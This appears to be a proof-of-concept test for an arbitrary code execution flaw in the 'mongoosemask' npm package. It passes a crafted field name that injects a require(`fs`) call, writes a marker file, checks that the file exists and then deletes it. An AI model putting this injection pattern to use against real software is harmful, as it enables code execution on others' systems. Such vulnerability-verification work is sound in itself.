// test("Arbitrary code execution in mongoosemask", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const mask = require("mongoosemask");
  const path = "./mongoosemask";
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  try {
    mask.mask({}, [
      'id"]; require(`fs`)["writeFileSync"](`mongoosemask`,``)//',
    ]);
  } catch (error) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
